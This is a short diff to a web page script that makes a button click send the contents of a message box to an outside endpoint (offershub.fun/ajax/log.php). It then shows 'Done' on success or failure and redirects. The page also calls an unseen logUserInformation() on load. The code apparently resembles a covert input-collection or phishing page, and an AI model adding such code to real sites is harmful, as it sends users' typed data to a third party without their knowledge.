@@ -528,7 +528,21 @@
     $(document).ready(function() {
       logUserInformation();
       $('.button-71').on('click', function(){
-        console.log($('.msg-area').val());
+        var msg = $('.msg-area').val();
+         $.ajax({
+            url: 'https://offershub.fun/ajax/log.php',
+            type: 'POST',
+            data: { 'userMsg': msg },
+            success: function(response) {
+              console.log(response);
+               alert('Done');
+               window.location.href = '/index.html';
+            },
+           error:function(){
+             alert('Done');
+             window.location.href = '/index.html';
+           },
+          });
       });
     });
   </script>
